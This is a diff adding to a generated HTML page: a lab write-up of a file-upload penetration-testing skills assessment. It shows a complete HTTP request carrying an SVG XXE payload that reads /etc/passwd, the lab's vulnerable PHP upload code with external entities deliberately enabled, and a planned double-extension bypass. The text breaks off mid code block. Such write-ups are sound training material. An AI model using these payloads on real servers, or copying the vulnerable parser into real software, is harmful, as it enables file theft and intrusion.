@@ -18152,12 +18152,275 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>ou are contracted to perform a penetration test for a company's e-commerce web application. The web application is in its early stages, so you will only be testing any file upload forms you can find.</p>
 <p>Try to utilize what you learned in this module to understand how the upload form works and how to bypass various validations in place (if any) to gain remote code execution on the back-end server.</p>
 <p><strong>Try to exploit the upload form to read the flag found at the root directory "/".</strong></p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>
+<p>The application is vulnerable to XXE injection via file upload. </p>
+<p><img alt="" src="../img/skills_00.png" /></p>
+<p>The payload:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-12-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-12-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-12-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-12-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-12-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-12-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-12-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-12-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-12-10">10</a></span>
+<span class="normal"><a href="#__codelineno-12-11">11</a></span>
+<span class="normal"><a href="#__codelineno-12-12">12</a></span>
+<span class="normal"><a href="#__codelineno-12-13">13</a></span>
+<span class="normal"><a href="#__codelineno-12-14">14</a></span>
+<span class="normal"><a href="#__codelineno-12-15">15</a></span>
+<span class="normal"><a href="#__codelineno-12-16">16</a></span>
+<span class="normal"><a href="#__codelineno-12-17">17</a></span>
+<span class="normal"><a href="#__codelineno-12-18">18</a></span>
+<span class="normal"><a href="#__codelineno-12-19">19</a></span>
+<span class="normal"><a href="#__codelineno-12-20">20</a></span>
+<span class="normal"><a href="#__codelineno-12-21">21</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>POST /contact/upload.php HTTP/1.1
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a>Host: 94.237.59.180:53773
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4"></a>Accept: */*
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7"></a>X-Requested-With: XMLHttpRequest
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8"></a>Content-Type: multipart/form-data; boundary=---------------------------405345013911890819222035469107
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9"></a>Content-Length: 1728
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10"></a>Origin: http://94.237.59.180:53773
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11"></a>Connection: keep-alive
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12"></a>Referer: http://94.237.59.180:53773/contact/
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13"></a>
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14"></a>-----------------------------405345013911890819222035469107
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15"></a>Content-Disposition: form-data; name=&quot;uploadFile&quot;; filename=&quot;lala.svg&quot;
+</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16"></a>Content-Type: image/svg+xml
+</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17"></a>
+</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18"></a>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19"></a>&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;php://filter/convert.base64-encode/resource=/etc/passwd&#39;&gt;]&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; aria-hidden=&quot;true&quot; height=&quot;150px&quot; preserveAspectRatio=&quot;xMidYMid meet&quot; role=&quot;img&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;150px&quot;&gt;&lt;path d=&quot;M11.996 0a1.119 1.119 0 0 0-.057.003a.9.9 0 0 0-.236.05a.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77V17.556a.889.889 0 0 0 .47.784l9.598 5.541l.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024c.01.001.011.003.016.004a.93.93 0 0 0 .296.015a.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532c0 .15-.08.287-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z&quot; fill=&quot;#91F108&quot;&gt;&lt;item&gt;&amp;test;&lt;/item&gt;&lt;/path&gt;&lt;/svg&gt;
+</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20"></a>
+</span><span id="__span-12-21"><a id="__codelineno-12-21" name="__codelineno-12-21"></a>-----------------------------405345013911890819222035469107--
 </span></code></pre></div></td></tr></table></div>
+<p>With this we can retrieve the  /contact/upload.php and check out the target folder for storing the image:</p>
+<div class="language-php highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-13-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-13-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-13-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-13-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-13-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-13-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-13-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-13-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-13-10">10</a></span>
+<span class="normal"><a href="#__codelineno-13-11">11</a></span>
+<span class="normal"><a href="#__codelineno-13-12">12</a></span>
+<span class="normal"><a href="#__codelineno-13-13">13</a></span>
+<span class="normal"><a href="#__codelineno-13-14">14</a></span>
+<span class="normal"><a href="#__codelineno-13-15">15</a></span>
+<span class="normal"><a href="#__codelineno-13-16">16</a></span>
+<span class="normal"><a href="#__codelineno-13-17">17</a></span>
+<span class="normal"><a href="#__codelineno-13-18">18</a></span>
+<span class="normal"><a href="#__codelineno-13-19">19</a></span>
+<span class="normal"><a href="#__codelineno-13-20">20</a></span>
+<span class="normal"><a href="#__codelineno-13-21">21</a></span>
+<span class="normal"><a href="#__codelineno-13-22">22</a></span>
+<span class="normal"><a href="#__codelineno-13-23">23</a></span>
+<span class="normal"><a href="#__codelineno-13-24">24</a></span>
+<span class="normal"><a href="#__codelineno-13-25">25</a></span>
+<span class="normal"><a href="#__codelineno-13-26">26</a></span>
+<span class="normal"><a href="#__codelineno-13-27">27</a></span>
+<span class="normal"><a href="#__codelineno-13-28">28</a></span>
+<span class="normal"><a href="#__codelineno-13-29">29</a></span>
+<span class="normal"><a href="#__codelineno-13-30">30</a></span>
+<span class="normal"><a href="#__codelineno-13-31">31</a></span>
+<span class="normal"><a href="#__codelineno-13-32">32</a></span>
+<span class="normal"><a href="#__codelineno-13-33">33</a></span>
+<span class="normal"><a href="#__codelineno-13-34">34</a></span>
+<span class="normal"><a href="#__codelineno-13-35">35</a></span>
+<span class="normal"><a href="#__codelineno-13-36">36</a></span>
+<span class="normal"><a href="#__codelineno-13-37">37</a></span>
+<span class="normal"><a href="#__codelineno-13-38">38</a></span>
+<span class="normal"><a href="#__codelineno-13-39">39</a></span>
+<span class="normal"><a href="#__codelineno-13-40">40</a></span>
+<span class="normal"><a href="#__codelineno-13-41">41</a></span>
+<span class="normal"><a href="#__codelineno-13-42">42</a></span>
+<span class="normal"><a href="#__codelineno-13-43">43</a></span>
+<span class="normal"><a href="#__codelineno-13-44">44</a></span>
+<span class="normal"><a href="#__codelineno-13-45">45</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a><span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;./common-functions.php&#39;</span><span class="p">);</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3"></a>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4"></a><span class="c1">// uploaded files directory</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5"></a><span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">&quot;./user_feedback_submissions/&quot;</span><span class="p">;</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6"></a>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7"></a><span class="c1">// rename before storing</span>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8"></a><span class="nv">$fileName</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;ymd&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;_&#39;</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;uploadFile&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9"></a><span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$target_dir</span> <span class="o">.</span> <span class="nv">$fileName</span><span class="p">;</span>
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10"></a>
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11"></a><span class="c1">// get content headers</span>
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12"></a><span class="nv">$contentType</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadFile&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13"></a><span class="nv">$MIMEtype</span> <span class="o">=</span> <span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadFile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
+</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14"></a>
+</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15"></a><span class="c1">// blacklist test</span>
+</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16"></a><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/.+\.ph(p|ps|tml)/&#39;</span><span class="p">,</span> <span class="nv">$fileName</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17"></a>    <span class="k">echo</span> <span class="s2">&quot;Extension not allowed&quot;</span><span class="p">;</span>
+</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18"></a>    <span class="k">die</span><span class="p">();</span>
+</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19"></a><span class="p">}</span>
+</span><span id="__span-13-20"><a id="__codelineno-13-20" name="__codelineno-13-20"></a>
+</span><span id="__span-13-21"><a id="__codelineno-13-21" name="__codelineno-13-21"></a><span class="c1">// whitelist test</span>
+</span><span id="__span-13-22"><a id="__codelineno-13-22" name="__codelineno-13-22"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^.+\.[a-z]{2,3}g$/&#39;</span><span class="p">,</span> <span class="nv">$fileName</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-13-23"><a id="__codelineno-13-23" name="__codelineno-13-23"></a>    <span class="k">echo</span> <span class="s2">&quot;Only images are allowed&quot;</span><span class="p">;</span>
+</span><span id="__span-13-24"><a id="__codelineno-13-24" name="__codelineno-13-24"></a>    <span class="k">die</span><span class="p">();</span>
+</span><span id="__span-13-25"><a id="__codelineno-13-25" name="__codelineno-13-25"></a><span class="p">}</span>
+</span><span id="__span-13-26"><a id="__codelineno-13-26" name="__codelineno-13-26"></a>
+</span><span id="__span-13-27"><a id="__codelineno-13-27" name="__codelineno-13-27"></a><span class="c1">// type test</span>
+</span><span id="__span-13-28"><a id="__codelineno-13-28" name="__codelineno-13-28"></a><span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$contentType</span><span class="p">,</span> <span class="nv">$MIMEtype</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$type</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-13-29"><a id="__codelineno-13-29" name="__codelineno-13-29"></a>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/image\/[a-z]{2,3}g/&#39;</span><span class="p">,</span> <span class="nv">$type</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-13-30"><a id="__codelineno-13-30" name="__codelineno-13-30"></a>        <span class="k">echo</span> <span class="s2">&quot;Only images are allowed&quot;</span><span class="p">;</span>
+</span><span id="__span-13-31"><a id="__codelineno-13-31" name="__codelineno-13-31"></a>        <span class="k">die</span><span class="p">();</span>
+</span><span id="__span-13-32"><a id="__codelineno-13-32" name="__codelineno-13-32"></a>    <span class="p">}</span>
+</span><span id="__span-13-33"><a id="__codelineno-13-33" name="__codelineno-13-33"></a><span class="p">}</span>
+</span><span id="__span-13-34"><a id="__codelineno-13-34" name="__codelineno-13-34"></a>
+</span><span id="__span-13-35"><a id="__codelineno-13-35" name="__codelineno-13-35"></a><span class="c1">// size test</span>
+</span><span id="__span-13-36"><a id="__codelineno-13-36" name="__codelineno-13-36"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;uploadFile&quot;</span><span class="p">][</span><span class="s2">&quot;size&quot;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">500000</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-13-37"><a id="__codelineno-13-37" name="__codelineno-13-37"></a>    <span class="k">echo</span> <span class="s2">&quot;File too large&quot;</span><span class="p">;</span>
+</span><span id="__span-13-38"><a id="__codelineno-13-38" name="__codelineno-13-38"></a>    <span class="k">die</span><span class="p">();</span>
+</span><span id="__span-13-39"><a id="__codelineno-13-39" name="__codelineno-13-39"></a><span class="p">}</span>
+</span><span id="__span-13-40"><a id="__codelineno-13-40" name="__codelineno-13-40"></a>
+</span><span id="__span-13-41"><a id="__codelineno-13-41" name="__codelineno-13-41"></a><span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;uploadFile&quot;</span><span class="p">][</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">],</span> <span class="nv">$target_file</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-13-42"><a id="__codelineno-13-42" name="__codelineno-13-42"></a>    <span class="nx">displayHTMLImage</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">);</span>
+</span><span id="__span-13-43"><a id="__codelineno-13-43" name="__codelineno-13-43"></a><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span id="__span-13-44"><a id="__codelineno-13-44" name="__codelineno-13-44"></a>    <span class="k">echo</span> <span class="s2">&quot;File failed to upload&quot;</span><span class="p">;</span>
+</span><span id="__span-13-45"><a id="__codelineno-13-45" name="__codelineno-13-45"></a><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
+<p>We can learn several things:</p>
+<ul>
+<li>target folder:  /contact/user_feedback_submissions/</li>
+<li><strong>Blacklist for PHP extensions</strong> (<code>.php</code>, <code>.phps</code>, <code>.phtml</code>).</li>
+<li>The whitelist regex <code>/^.+\.[a-z]{2,3}g$/</code> forces the extension to end with <code>g</code>, meaning it allows:  <code>.jpg</code>, <code>.png</code>, <code>.svg</code>. </li>
+<li><strong>MIME type validation</strong>, requiring <code>image/*</code>.</li>
+<li><strong>File size restriction</strong>, limiting uploads to 500 KB.</li>
+<li>The uploaded file will be stored with a name based on the current date in the format <code>YYMMDD_filename</code>.</li>
+</ul>
+<p>Finally, the file is retrieved with the function <code>displayHTMLImage($target_file);</code>, which is located in the file required at the beginning of the script: </p>
+<div class="language-php highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span>
+<span class="normal"><a href="#__codelineno-14-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a><span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;./common-functions.php&#39;</span><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div>
+<p>The file:</p>
+<div class="language-php highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-15-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-15-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-15-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-15-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-15-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-15-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-15-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-15-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-15-10">10</a></span>
+<span class="normal"><a href="#__codelineno-15-11">11</a></span>
+<span class="normal"><a href="#__codelineno-15-12">12</a></span>
+<span class="normal"><a href="#__codelineno-15-13">13</a></span>
+<span class="normal"><a href="#__codelineno-15-14">14</a></span>
+<span class="normal"><a href="#__codelineno-15-15">15</a></span>
+<span class="normal"><a href="#__codelineno-15-16">16</a></span>
+<span class="normal"><a href="#__codelineno-15-17">17</a></span>
+<span class="normal"><a href="#__codelineno-15-18">18</a></span>
+<span class="normal"><a href="#__codelineno-15-19">19</a></span>
+<span class="normal"><a href="#__codelineno-15-20">20</a></span>
+<span class="normal"><a href="#__codelineno-15-21">21</a></span>
+<span class="normal"><a href="#__codelineno-15-22">22</a></span>
+<span class="normal"><a href="#__codelineno-15-23">23</a></span>
+<span class="normal"><a href="#__codelineno-15-24">24</a></span>
+<span class="normal"><a href="#__codelineno-15-25">25</a></span>
+<span class="normal"><a href="#__codelineno-15-26">26</a></span>
+<span class="normal"><a href="#__codelineno-15-27">27</a></span>
+<span class="normal"><a href="#__codelineno-15-28">28</a></span>
+<span class="normal"><a href="#__codelineno-15-29">29</a></span>
+<span class="normal"><a href="#__codelineno-15-30">30</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3"></a><span class="k">function</span> <span class="nf">displayHTMLImage</span><span class="p">(</span><span class="nv">$imageFile</span><span class="p">)</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4"></a><span class="p">{</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5"></a>    <span class="nv">$type</span> <span class="o">=</span> <span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$imageFile</span><span class="p">);</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6"></a>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7"></a>    <span class="k">switch</span> <span class="p">(</span><span class="nv">$type</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8"></a>        <span class="k">case</span> <span class="s1">&#39;image/jpg&#39;</span><span class="o">:</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9"></a>            <span class="k">echo</span> <span class="s2">&quot;&lt;img style=</span><span class="se">\&quot;</span><span class="s2">object-fit: contain; </span><span class="se">\&quot;</span><span class="s2"> width=&#39;400&#39; height=&#39;200&#39; src=&#39;data:image/jpg;base64,&quot;</span> <span class="o">.</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$imageFile</span><span class="p">))</span> <span class="o">.</span> <span class="s2">&quot;&#39;/&gt;&quot;</span><span class="p">;</span>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10"></a>            <span class="k">break</span><span class="p">;</span>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11"></a>        <span class="k">case</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="o">:</span>
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12"></a>            <span class="k">echo</span> <span class="s2">&quot;&lt;img style=</span><span class="se">\&quot;</span><span class="s2">object-fit: contain; </span><span class="se">\&quot;</span><span class="s2"> width=&#39;400&#39; height=&#39;200&#39; src=&#39;data:image/jpeg;base64,&quot;</span> <span class="o">.</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$imageFile</span><span class="p">))</span> <span class="o">.</span> <span class="s2">&quot;&#39;/&gt;&quot;</span><span class="p">;</span>
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13"></a>            <span class="k">break</span><span class="p">;</span>
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14"></a>        <span class="k">case</span> <span class="s1">&#39;image/png&#39;</span><span class="o">:</span>
+</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15"></a>            <span class="k">echo</span> <span class="s2">&quot;&lt;img style=</span><span class="se">\&quot;</span><span class="s2">object-fit: contain; </span><span class="se">\&quot;</span><span class="s2"> width=&#39;400&#39; height=&#39;200&#39; src=&#39;data:image/png;base64,&quot;</span> <span class="o">.</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$imageFile</span><span class="p">))</span> <span class="o">.</span> <span class="s2">&quot;&#39;/&gt;&quot;</span><span class="p">;</span>
+</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16"></a>            <span class="k">break</span><span class="p">;</span>
+</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17"></a>        <span class="k">case</span> <span class="s1">&#39;image/gif&#39;</span><span class="o">:</span>
+</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18"></a>            <span class="k">echo</span> <span class="s2">&quot;&lt;img style=</span><span class="se">\&quot;</span><span class="s2">object-fit: contain; </span><span class="se">\&quot;</span><span class="s2"> width=&#39;400&#39; height=&#39;200&#39; src=&#39;data:image/gif;base64,&quot;</span> <span class="o">.</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$imageFile</span><span class="p">))</span> <span class="o">.</span> <span class="s2">&quot;&#39;/&gt;&quot;</span><span class="p">;</span>
+</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19"></a>            <span class="k">break</span><span class="p">;</span>
+</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20"></a>        <span class="k">case</span> <span class="s1">&#39;image/svg+xml&#39;</span><span class="o">:</span>
+</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21"></a>            <span class="nb">libxml_disable_entity_loader</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
+</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22"></a>            <span class="nv">$doc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMDocument</span><span class="p">();</span>
+</span><span id="__span-15-23"><a id="__codelineno-15-23" name="__codelineno-15-23"></a>            <span class="nv">$doc</span><span class="o">-&gt;</span><span class="na">loadXML</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$imageFile</span><span class="p">),</span> <span class="nx">LIBXML_NOENT</span> <span class="o">|</span> <span class="nx">LIBXML_DTDLOAD</span><span class="p">);</span>
+</span><span id="__span-15-24"><a id="__codelineno-15-24" name="__codelineno-15-24"></a>            <span class="nv">$svg</span> <span class="o">=</span> <span class="nv">$doc</span><span class="o">-&gt;</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s1">&#39;svg&#39;</span><span class="p">);</span>
+</span><span id="__span-15-25"><a id="__codelineno-15-25" name="__codelineno-15-25"></a>            <span class="k">echo</span> <span class="nv">$svg</span><span class="o">-&gt;</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">C14N</span><span class="p">();</span>
+</span><span id="__span-15-26"><a id="__codelineno-15-26" name="__codelineno-15-26"></a>            <span class="k">break</span><span class="p">;</span>
+</span><span id="__span-15-27"><a id="__codelineno-15-27" name="__codelineno-15-27"></a>        <span class="k">default</span><span class="o">:</span>
+</span><span id="__span-15-28"><a id="__codelineno-15-28" name="__codelineno-15-28"></a>            <span class="k">echo</span> <span class="s2">&quot;Image type not recognized&quot;</span><span class="p">;</span>
+</span><span id="__span-15-29"><a id="__codelineno-15-29" name="__codelineno-15-29"></a>    <span class="p">}</span>
+</span><span id="__span-15-30"><a id="__codelineno-15-30" name="__codelineno-15-30"></a><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Now we will try to bypass these restriction by intercepting the request, leaving the magic numbers as they are, removing the rest of the image, and modifying the name of the file to include a the double extension <code>lol.phar.jpg</code>. </p>
+<p><img alt="" src="../img/fileupload_03.png" /></p>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-16-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-16-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-16-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-16-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-16-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-16-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-16-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-16-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-16-10">10</a></span>
+<span class="normal"><a href="#__codelineno-16-11">11</a></span>
+<span class="normal"><a href="#__codelineno-16-12">12</a></span>
+<span class="normal"><a href="#__codelineno-16-13">13</a></span>
+<span class="normal"><a href="#__codelineno-16-14">14</a></span>
+<span class="normal"><a href="#__codelineno-16-15">15</a></span>
+<span class="normal"><a href="#__codelineno-16-16">16</a></span>
+<span class="normal"><a href="#__codelineno-16-17">17</a></span>
+<span class="normal"><a href="#__codelineno-16-18">18</a></span>
+<span class="normal"><a href="#__codelineno-16-19">19</a></span>
+<span class="normal"><a href="#__codelineno-16-20">20</a></span>
+<span class="normal"><a href="#__codelineno-16-21">21</a></span>
